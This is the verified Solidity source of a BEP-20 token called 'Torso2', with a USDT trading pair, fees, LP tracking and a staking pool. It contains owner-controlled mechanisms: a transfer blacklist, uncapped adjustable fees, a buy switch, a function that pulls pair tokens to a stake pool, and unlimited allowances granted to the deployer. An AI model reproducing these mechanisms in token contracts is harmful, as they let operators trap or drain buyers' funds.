/**
 *Submitted for verification at BscScan.com on 2025-05-26
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

interface IPool {
    function requireUpdate() external;

    function staticPool() external view returns (address);
    function teamPool() external view returns (address);
}

abstract contract AbsToken is IERC20, Ownable {
    struct UserInfo {
        uint256 lpAmount;
        uint256 preLPAmount;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public transferAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter private immutable _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyDestroyFee = 50;
    uint256 public _buyFundFee = 200;

    uint256 public _sellDestroyFee = 50;
    uint256 public _sellFundFee = 450;

    uint256 public startTradeTime;
    uint256 public startAddLPTime;

    address public immutable _mainPair;
    mapping(address => UserInfo) private _userInfo;

    mapping(address => bool) public _swapRouters;

    constructor(
        address RouterAddress,
        address USDTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address ReceiveAddress,
        address FundAddress,
        address TransferAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _usdt = USDTAddress;
        require(address(this) > _usdt, "s");

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;
        IERC20(_usdt).approve(address(swapRouter), MAX);
        IERC20(_usdt).approve(tx.origin, MAX);
        _allowances[address(this)][tx.origin] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address pair = swapFactory.createPair(address(this), _usdt);
        _swapPairList[pair] = true;
        _mainPair = pair;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        _feeWhiteList[fundAddress] = true;

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        _userInfo[fundAddress].lpAmount = MAX / 10;

        _swapRouters[
            address(0x9a489505a00cE272eAa5e07Dba6491314CaE3796)
        ] = true;
        _swapRouters[
            address(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)
        ] = true;
        _swapRouters[
            address(0x1A0A18AC4BECDDbd6389559687d1A73d8927E416)
        ] = true;
        _swapRouters[
            address(0xd77C2afeBf3dC665af07588BF798bd938968c72E)
        ] = true;
        _swapRouters[
            address(0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768)
        ] = true;
        _swapRouters[
            address(0x87FD5305E6a40F378da124864B2D479c2028BD86)
        ] = true;
        _swapRouters[
            address(0xd9C500DfF816a1Da21A48A732d3498Bf09dc9AEB)
        ] = true;

        transferAddress = TransferAddress;
        _feeWhiteList[transferAddress] = true;

        _minTotal = 210000 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(
            !_blackList[from] || _feeWhiteList[from] || _swapPairList[from],
            "blackList"
        );

        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");

        if (from == _stakePool || to == _stakePool) {
            _standTransfer(from, to, amount);
            return;
        }

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (address(_swapRouter) != from) {
                uint256 maxSellAmount = (balance * 999) / 1000;
                if (amount > maxSellAmount) {
                    amount = maxSellAmount;
                }
                takeFee = true;
            }
        }

        address txOrigin = tx.origin;
        UserInfo storage userInfo;
        uint256 addLPLiquidity;
        if (
            to == _mainPair &&
            address(_swapRouter) == msg.sender &&
            txOrigin == from
        ) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                userInfo = _userInfo[txOrigin];
                userInfo.lpAmount += addLPLiquidity;
                if (0 == startTradeTime) {
                    userInfo.preLPAmount += addLPLiquidity;
                }
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            removeLPLiquidity = _isRemoveLiquidity(amount);
            if (removeLPLiquidity > 0) {
                require(_userInfo[txOrigin].lpAmount >= removeLPLiquidity);
                _userInfo[txOrigin].lpAmount -= removeLPLiquidity;
                if (_feeWhiteList[txOrigin]) {
                    takeFee = false;
                }
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPTime) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPTime = block.timestamp;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeTime) {
                    require(0 < startAddLPTime && (addLPLiquidity > 0));
                } else {}
            }
        }

        if (from != _mainPair && 0 == addLPLiquidity) {
            if (
                txOrigin == from &&
                (msg.sender == txOrigin || _swapRouters[msg.sender])
            ) {
                IPool pool = IPool(_stakePool);
                if (address(0) != address(pool)) {
                    pool.requireUpdate();
                }
            }
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            addLPLiquidity,
            removeLPLiquidity
        );
    }

    function _isAddLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        if (balanceOther > 0 && balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function _isRemoveLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        if (balanceOther < rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply()) /
                (balanceOf(_mainPair) - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = (amount * rOther) / (rThis - amount);
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator;
                    uint256 denominator;
                    if (
                        address(_swapRouter) ==
                        address(0x10ED43C718714eb63d5aA57B78B54704E256024E)
                    ) {
                        // BSC Pancake
                        numerator = pairTotalSupply * (rootK - rootKLast) * 8;
                        denominator = rootK * 17 + (rootKLast * 8);
                    } else if (
                        address(_swapRouter) ==
                        address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)
                    ) {
                        //BSC testnet Pancake
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 3 + rootKLast;
                    } else if (
                        address(_swapRouter) ==
                        address(0xE9d6f80028671279a28790bb4007B10B0595Def1)
                    ) {
                        //PG W3Swap
                        numerator = pairTotalSupply * (rootK - rootKLast) * 3;
                        denominator = rootK * 5 + rootKLast;
                    } else {
                        //SushiSwap,UniSwap,OK Cherry Swap
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 5 + rootKLast;
                    }
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis, uint256 balanceOther)
    {
        (rOther, rThis) = __getReserves();
        balanceOther = IERC20(_usdt).balanceOf(_mainPair);
    }

    function __getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis)
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
    }

    function _standTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _takeTransfer(sender, recipient, tAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        uint256 addLPLiquidity,
        uint256 removeLPLiquidity
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        bool isSell;
        uint256 destroyFeeAmount;
        uint256 fundFeeAmount;
        if (addLPLiquidity > 0) {} else if (removeLPLiquidity > 0) {
            if (takeFee) {
                feeAmount += _calRemoveFeeAmount(
                    sender,
                    tAmount,
                    removeLPLiquidity
                );
            }
        } else if (_swapPairList[recipient]) {
            isSell = true;
            //Sell
            if (takeFee) {
                fundFeeAmount = (tAmount * _sellFundFee) / 10000;
                destroyFeeAmount = (tAmount * _sellDestroyFee) / 10000;
            }
        } else if (_swapPairList[sender]) {
            //Buy
            if (takeFee) {
                require(_startBuy);
                fundFeeAmount = (tAmount * _buyFundFee) / 10000;
                destroyFeeAmount = (tAmount * _buyDestroyFee) / 10000;
            }
        } else {
            //Transfer
            if (takeFee) {
                uint256 transferFeeAmount = (tAmount * _transferFee) / 10000;
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, transferAddress, transferFeeAmount);
            }
        }
        if (destroyFeeAmount > 0) {
            feeAmount += destroyFeeAmount;
            _takeTransfer(sender, address(0xdead), destroyFeeAmount);
        }
        if (fundFeeAmount > 0) {
            feeAmount += fundFeeAmount;
            _takeTransfer(sender, fundAddress, fundFeeAmount);
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public _removeLPFee = 250;
    uint256 public _removePreLPFee = 10000;

    function _calRemoveFeeAmount(
        address sender,
        uint256 tAmount,
        uint256 removeLPLiquidity
    ) private returns (uint256 feeAmount) {
        UserInfo storage userInfo = _userInfo[tx.origin];
        uint256 selfLPAmount = userInfo.lpAmount +
            removeLPLiquidity -
            userInfo.preLPAmount;
        uint256 removeLockLPAmount = removeLPLiquidity;
        uint256 removeSelfLPAmount = removeLPLiquidity;
        if (removeLPLiquidity > selfLPAmount) {
            removeSelfLPAmount = selfLPAmount;
        }
        uint256 lpFeeAmount;
        if (removeSelfLPAmount > 0) {
            removeLockLPAmount -= removeSelfLPAmount;
            lpFeeAmount =
                (((tAmount * removeSelfLPAmount) / removeLPLiquidity) *
                    _removeLPFee) /
                10000;
            feeAmount += lpFeeAmount;
            if (lpFeeAmount > 0) {
                _takeTransfer(sender, address(this), lpFeeAmount);
            }
        }
        uint256 destroyFeeAmount = (((tAmount * removeLockLPAmount) /
            removeLPLiquidity) * _removePreLPFee) / 10000;
        if (destroyFeeAmount > 0) {
            feeAmount += destroyFeeAmount;
            _takeTransfer(sender, address(0xdead), destroyFeeAmount);
        }
        userInfo.preLPAmount -= removeLockLPAmount;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
        _userInfo[fundAddress].lpAmount = MAX / 10;
    }

    function setTransferAddress(address addr) external onlyOwner {
        transferAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyFee(uint256 destroyFee, uint256 fundFee) external onlyOwner {
        _buyDestroyFee = destroyFee;
        _buyFundFee = fundFee;
    }

    function setSellFee(
        uint256 destroyFee,
        uint256 fundFee
    ) external onlyOwner {
        _sellDestroyFee = destroyFee;
        _sellFundFee = fundFee;
    }

    uint256 public _transferFee = 1000;

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferFee = fee;
    }

    function setRemoveLPFee(uint256 fee) external onlyOwner {
        _removeLPFee = fee;
    }

    function setRemovePreLPFee(uint256 fee) external onlyOwner {
        _removePreLPFee = fee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeTime, "trading");
        startTradeTime = block.timestamp;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            payable(fundAddress).transfer(amount);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}

    function updateLPAmount(
        address account,
        uint256 lpAmount
    ) public onlyOwner {
        UserInfo storage userInfo = _userInfo[account];
        userInfo.lpAmount = lpAmount;
    }

    function getUserInfo(
        address account
    )
        public
        view
        returns (uint256 lpAmount, uint256 lpBalance, uint256 preLPAmount)
    {
        lpBalance = IERC20(_mainPair).balanceOf(account);
        UserInfo storage userInfo = _userInfo[account];
        lpAmount = userInfo.lpAmount;
        preLPAmount = userInfo.preLPAmount;
    }

    function initLPAmounts(
        address[] memory accounts,
        uint256 lpAmount
    ) public onlyOwner {
        uint256 len = accounts.length;
        address account;
        UserInfo storage userInfo;
        for (uint256 i; i < len; ) {
            account = accounts[i];
            userInfo = _userInfo[account];
            userInfo.lpAmount = lpAmount;
            userInfo.preLPAmount = lpAmount;
            unchecked {
                ++i;
            }
        }
    }

    function setSwapRouter(address addr, bool enable) external onlyOwner {
        _swapRouters[addr] = enable;
    }

    address public _stakePool;
    function setStakePool(address addr) external onlyOwner {
        _stakePool = addr;
        IPool pool = IPool(_stakePool);
        _allowances[pool.staticPool()][_stakePool] = MAX;
        _allowances[pool.teamPool()][_stakePool] = MAX;
        _feeWhiteList[_stakePool] = true;
        _feeWhiteList[pool.teamPool()] = true;
        _feeWhiteList[pool.staticPool()] = true;
    }

    mapping(address => bool) public _blackList;

    function batchSetBlackList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    bool public _startBuy;

    function setStartBuy(bool enable) external onlyOwner {
        _startBuy = enable;
    }

    function fundSetStartBuy(bool enable) external {
        if (msg.sender == fundAddress) {
            _startBuy = enable;
        }
    }

    function fundSetWhiteList(address adr, bool enable) external {
        if (msg.sender == fundAddress) {
            _feeWhiteList[adr] = enable;
        }
    }

    function rewardSync(uint256 amount) public returns (uint256 realAmount) {
        realAmount = amount;
        require(msg.sender == _stakePool, "rq stake");
        uint256 poolToken = balanceOf(_mainPair);
        uint256 maxAmount = (poolToken * 5) / 10;
        if (realAmount > maxAmount) {
            realAmount = maxAmount;
        }

        uint256 minTotal = _minTotal;
        if (poolToken <= minTotal) {
            maxAmount = 0;
        } else {
            maxAmount = poolToken - minTotal;
        }

        if (realAmount > maxAmount) {
            realAmount = maxAmount;
        }

        if (realAmount > 0) {
            _standTransfer(_mainPair, _stakePool, realAmount);
            ISwapPair(_mainPair).sync();
        }
    }

    uint256 public _minTotal;

    function setMinTotal(uint256 total) external onlyOwner {
        _minTotal = total;
    }
}

contract Torso2 is AbsToken {
    constructor()
        AbsToken(
            //SwapRouter
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0x55d398326f99059fF775485246999027B3197955),
            "Torso2",
            "Torso2",
            18,
            21000000,
            address(0xAaD78eEde5fB1a61752A227c1B93F6f3D978aAc2),
            address(0x3F44f75Be4DECA9de5AE0663B8bff29b59221648),
            address(0xF81B624EFAe48412878b7B06D7AB35FB6128DaA9)
        )
    {}
}